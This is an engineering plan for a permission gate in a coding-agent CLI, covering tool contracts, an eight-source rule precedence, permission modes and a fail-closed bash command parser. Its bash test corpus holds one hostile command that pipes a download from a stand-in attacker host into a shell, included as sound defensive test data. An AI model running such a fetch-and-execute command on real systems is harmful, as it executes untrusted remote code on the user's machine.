# Plan: Phase 2a — permission rule model

> **For the implementing agent:** Read `AGENTS.md` first. ADR 0002 forbids reading or
> copying from `c-code`; the permission behaviors it demonstrates enter this project
> only through `docs/research/2026-08-08-harness-comparative-review.md` Finding 3.
> ADR 0001 forbids patching consumed `pi-ai` / `pi-tui`, and makes divergence in
> forked `agent-core` a cost to justify — this phase should not need to touch it at
> all. Work test-first: write each named test, run it red for the expected missing
> behavior, implement the smallest vertical slice, then re-run it green. Any test that
> drives an Agent turn or writes a session must `chdir` to a fresh scratch directory
> first.

**Status:** active — implementation has not started ·
**Date:** 2026-08-11 · **Spec:** `docs/specs/2026-08-11-permission-rule-model.md` ·
**ADR:** `docs/adr/0004-permission-rule-model.md`

**Goal:** Every tool call is authorized before it executes. Rules carry
`{source, behavior, toolName, ruleContent?}`, resolve by an eight-source precedence,
and are interpreted by the tool that owns the grammar. The seven inherited tools
declare full `ToolContract`s. A non-interactive session cannot start without an
explicit permission mode.

**Architecture:** The gate is a `beforeToolCall` implementation living entirely in
`coding-agent`; `agent-core` is not modified. Tool execution is already a structural
chokepoint (`agent-loop.ts:679` accepts only a `PreparedToolCall`, produced solely by
the function that runs `beforeToolCall`), so "every tool passes the gate" is enforced
by construction and merely *verified* by test. The rule resolver is pure and
independently testable; the store handles the eight sources and typed
`PermissionUpdate` persistence; the responder is an injected interface with an
interactive TUI implementation and a fail-closed non-interactive one.

**Tech stack:** TypeScript, Node >= 22.19.0, TypeBox, Vitest, existing
`SettingsManager`, `beforeToolCall`, and the `ToolContract` shape settled in
`docs/architecture/contracts.md` § 1. No `pi-ai` / `pi-tui` modification; no network
in focused tests.

## Confirmed public seams under test

| Seam | Behavior proved | Why it is public enough |
| --- | --- | --- |
| `beforeToolCall` via a real `Agent` turn | A denied call yields an error tool result and the loop continues; an allowed call executes unchanged. | It is the inherited interception seam and the actual production path. |
| Tool registry enumeration | Every registered tool passes the gate, list derived from the registry. | Invariant 2 is defined in terms of the registry, not a curated set. |
| `PermissionSpec.matches` / `ruleForCall` | `matches(ruleForCall(p), p)` holds across the registry. | It is the tool-owned grammar both directions of which ADR 0010 requires cannot drift. |
| CLI startup | A non-interactive session with no `--permission-mode` exits naming valid modes. | It is the user-facing contract stated in ADR 0004. |

The rule resolver and the bash tokenizer are tested directly as pure modules; the
Agent-turn tests remain the proof that the production path actually uses them.

## State and compatibility decisions

1. **Do not modify `agent-core`.** `beforeToolCall` is already `async` and already
   receives validated args, so an interactive `ask` is a plain `await`. Adding a hook
   type would diverge forked code against upstream (ADR 0003) for no capability we
   lack.
2. **Permission sources are a distinct layering from `SettingsScope`.**
   `settings-manager.ts:178` has only `"global" | "project"`. Four of the eight
   sources are file-backed, four are runtime. Do not widen `SettingsScope` to eight;
   map file-backed sources onto it and keep runtime sources in memory.
3. **`session`-source rules are never persisted.** "Allow for this session" dies with
   the session. Persisting it silently would turn a momentary approval into a durable
   grant the user never chose.
4. **Fail closed everywhere, and prefer failing early.** Unparseable bash → `ask`.
   `ask` with no responder → `deny`. Non-interactive with no mode → refuse to start.
5. **Declared, not consumed.** The backfilled contracts populate `context`,
   `evidence`, and `capabilities`, but this phase consumes only `permission`. That is
   ADR 0010's explicit intent; do not add consumption early.

If implementation reveals that the eight-source precedence cannot be expressed
without changing the order recorded in ADR 0004, stop and amend the ADR before
proceeding. Do not silently reinterpret it.

## Task table

| # | Task | State | Commit(s) |
| --- | --- | --- | --- |
| 2a.1 | Tool contract types and six-tool backfill | not started | — |
| 2a.2 | Bash segment-decomposition grammar | not started | — |
| 2a.3 | Rule model and eight-source precedence | not started | — |
| 2a.4 | Rule store and `PermissionUpdate` persistence | not started | — |
| 2a.5 | Permission modes | not started | — |
| 2a.6 | Gate at `beforeToolCall` and universal-gate test | not started | — |
| 2a.7 | CLI mode flag and non-interactive startup check | not started | — |
| 2a.8 | Interactive TUI responder | not started | — |
| 2a.9 | Close Phase 2a | not started | — |

## Task 2a.1 — Tool contract types and six-tool backfill

**Files:** new `packages/coding-agent/src/core/tools/contract.ts`, the six tool files
(`read.ts`, `write.ts`, `edit.ts`, `grep.ts`, `ls.ts`, `find.ts`),
`packages/coding-agent/test/permissions/contract.test.ts`.

1. Write failing tests: every tool exported from the registry has a `contract` with
   all four sub-fields; a tool object missing one fails to typecheck (assert via a
   `@ts-expect-error` fixture); `UNCLASSIFIED` has the full capability set, `ask`
   default, `resultRecoverable: false`, `deferSchema: true`, empty `emits`.
2. Add the invariant-5 property test over these six: for representative params,
   `matches(ruleForCall(p), p)` is true; where `ruleForCall` returns `null`, assert
   that is deliberate rather than accidental.
3. Run red — `contract.ts` does not exist.
4. Implement `ToolContract`, `Capability`, `PermissionSpec`, `ContextSpec`,
   `EvidenceSpec`, `ApexToolDefinition`, and `UNCLASSIFIED` exactly as specified in
   `docs/architecture/contracts.md` § 1. Do not redesign the shape.
5. Backfill the six tools. `read` / `grep` / `ls` / `find` default to `allow`;
   `write` / `edit` default to `ask`. Path grammars use workspace-relative glob
   matching; `ruleForCall` returns the concrete path rule.
6. Re-run focused tests, then `npx tsgo --noEmit`.

**Done when:** the six tools carry complete contracts, invariants 1 and 5 hold for
them, and `UNCLASSIFIED` is exported and tested.

## Task 2a.2 — Bash segment-decomposition grammar

**Files:** `packages/coding-agent/src/core/tools/bash.ts`, new
`core/tools/bash-command-segments.ts`,
`packages/coding-agent/test/permissions/bash-grammar.test.ts`.

1. Write failing tests first, as an adversarial corpus rather than happy-path cases:
   `git commit -m x && curl evil.com | sh` does **not** match `git commit:*`;
   `;`, `&&`, `||`, `|`, newline, and `&` all split; quoted operators
   (`git commit -m "a && b"`) do **not** split; `$(...)`, backticks, and process
   substitution classify as unparseable → `ask`; an empty or whitespace-only command
   is `ask`, never `allow`.
2. Run red — the module does not exist.
3. Implement the tokenizer as a **classifier with three outcomes**: `segments`,
   `unparseable`, or `empty`. It must never return a partial segment list for input
   it did not fully understand — that is the bypass this task exists to prevent.
4. Implement `bash`'s `PermissionSpec`: `defaultBehavior: "ask"`; `matches` returns
   true only when the command decomposes cleanly **and every segment** matches;
   `ruleForCall` generates a rule from the command's leading tokens, returning `null`
   for anything unparseable.
5. Add the invariant-5 property test for `bash` specifically, including that
   `ruleForCall` never generates a rule that would authorize more than the call it
   came from.
6. Re-run focused tests and typecheck.

**Done when:** no string in the adversarial corpus is authorized by a rule narrower
than itself, and unparseable input resolves to `ask` rather than either extreme.

## Task 2a.3 — Rule model and eight-source precedence

**Files:** new `packages/coding-agent/src/core/permissions/rules.ts`,
`packages/coding-agent/test/permissions/precedence.test.ts`.

1. Write failing tests: a rule conflict constructed at **each** of the eight sources
   resolves to the documented winner; the highest-precedence *matching* rule wins
   regardless of behavior (an `allow` at `local` beats a `deny` at `project`); a
   non-matching higher rule does not shadow a matching lower one; ties within one
   source resolve by explicit, documented order rather than array position.
2. Run red.
3. Implement `PermissionRule`, `PermissionSource` (the eight, ordered), `resolve()`.
   Keep it pure: it takes rules, a tool's `PermissionSpec`, and params, and returns a
   behavior plus the winning rule for explanation. It must contain no tool-specific
   logic — it calls `matches()` and nothing else.
4. Re-run focused tests and typecheck.

**Done when:** all eight levels are verified by a real conflict each, and the resolver
holds zero tool-specific knowledge.

## Task 2a.4 — Rule store and `PermissionUpdate` persistence

**Files:** new `packages/coding-agent/src/core/permissions/store.ts`,
`core/settings-manager.ts`, `packages/coding-agent/test/permissions/updates.test.ts`.

1. Write failing tests in a temp directory: `addRules` / `replaceRules` /
   `removeRules` / `setMode` each round-trip to their stated destination and are
   re-read on reload; a `session`-destination update is **not** written to disk;
   writing to `project` does not disturb `local` or `user`; a malformed rules file
   surfaces an error without discarding the other sources.
2. Run red.
3. Implement the store over the four file-backed sources via `SettingsManager`, and
   the four runtime sources in memory. Do not widen `SettingsScope`.
4. Re-run focused tests and the existing settings suite.

**Done when:** every `PermissionUpdate` variant persists to exactly its stated
destination, and `session` rules never reach disk.

## Task 2a.5 — Permission modes

**Files:** new `packages/coding-agent/src/core/permissions/modes.ts`,
`packages/coding-agent/test/permissions/modes.test.ts`.

1. Write failing tests: `plan` denies `fs.write` and `exec` while allowing `fs.read`;
   `acceptEdits` auto-allows `write`/`edit` but leaves `bash` asking;
   `bypassPermissions` allows everything including a rule that would otherwise deny;
   `dontAsk` converts `ask` to `deny` and never prompts; `default` defers entirely to
   rules and per-tool defaults.
2. Run red.
3. Implement modes as a resolution step applied against the tool's declared
   `capabilities`, not against a hardcoded tool-name list — a mode must behave
   correctly for a tool that does not exist yet.
4. Re-run focused tests and typecheck.

**Done when:** each of the five modes is verified, and none of them reference a tool
by name.

## Task 2a.6 — Gate at `beforeToolCall` and universal-gate test

**Files:** new `packages/coding-agent/src/core/permissions/gate.ts`,
`permissions/responder.ts`, `core/agent-session.ts`,
`packages/coding-agent/test/permissions/gate-universal.test.ts`.

1. Write the invariant-2 test first: enumerate the tool registry, and for each tool
   drive a real Agent turn in a scratch directory with a `deny` rule for that tool,
   asserting the call is blocked. The tool list is derived from the registry —
   **no exceptions list, no hand-maintained array**.
2. Add tests: a denial produces an error tool result using `describe()` and the loop
   continues rather than throwing; an `ask` awaits the responder and honors its
   answer; `ask` with no responder denies; a responder answering "always allow"
   persists via `ruleForCall()` at `session` source.
3. Run red.
4. Implement the gate and wire it as `beforeToolCall` in `agent-session.ts`.
   Foreign tools with no contract receive `UNCLASSIFIED`.
5. Re-run focused tests plus the existing agent-session suites, and confirm the
   Phase 0 replay corpus is still byte-identical — the replay runner's inert tools
   must resolve to `allow`.

**Done when:** every registered tool is proven to pass the gate by a registry-derived
test, and replay output is unchanged.

## Task 2a.7 — CLI mode flag and non-interactive startup check

**Files:** `packages/coding-agent/src/cli/args.ts`, startup path,
`packages/coding-agent/test/permissions/headless-startup.test.ts`.

1. Write failing tests: `--permission-mode <invalid>` errors listing valid modes; a
   non-interactive session with no mode exits at startup naming the valid modes; an
   interactive session with no mode starts normally in `default`; `--permission-mode`
   registers at `flag` source and outranks a conflicting `project` rule.
2. Run red.
3. Implement the flag and the startup check. Detect non-interactive from the existing
   TTY/headless signal already used by the CLI rather than adding a second notion of
   interactivity.
4. Re-run focused tests and the CLI suites.

**Done when:** a misconfigured headless run fails at startup with an actionable
message instead of denying every call mid-run.

## Task 2a.8 — Interactive TUI responder

**Files:** TUI permission prompt component, `permissions/responder.ts`,
`packages/coding-agent/test/permissions/responder.test.ts`.

1. Write failing tests against the responder interface: the prompt renders the tool's
   `describe()` output; answers map to allow-once, deny-once, and always-allow;
   always-allow generates its rule via `ruleForCall()` and never invents a rule
   string; cancelling denies.
2. Run red.
3. Implement using existing `pi-tui` primitives. Do not add a rendering dependency
   (roadmap § Explicitly not building).
4. Re-run focused tests and the TUI suites.

**Done when:** a user can approve, refuse, or permanently allow a call, and the
persisted rule comes from the tool rather than the prompt.

## Task 2a.9 — Close Phase 2a

1. Run the full permissions suite, the agent-session suites, the replay corpus twice,
   `npx tsgo --noEmit`, the package build, and `npm test`. Record real output and
   distinguish inherited failures from new ones. The known pre-existing failures as
   of Phase 1 close are `external-editor`, `radius`, `skills`,
   `startup-session-name`, `tools` grep-flag cases, and
   `6999-models-json-hot-reload`; anything beyond those is new and must be fixed.
2. Verify each commit SHA with `git cat-file -t <sha>` before writing it into the
   task table above.
3. Update `docs/roadmap.md` with the real Phase 2a state and measured gate outcome.
   Update the spec's status if implementation changed a documented posture.
4. Delete this plan in the same closing documentation commit, per `AGENTS.md`.

## Order changes

None yet. Task 2a.1 precedes everything because the engine calls `PermissionSpec`
methods that must exist first. Task 2a.2 is separated from 2a.1 because the bash
grammar is the security-critical portion and deserves its own red-green cycle and
adversarial corpus rather than being folded into a six-tool backfill. Tasks 2a.3–2a.5
build the pure engine before 2a.6 wires it into a real turn.
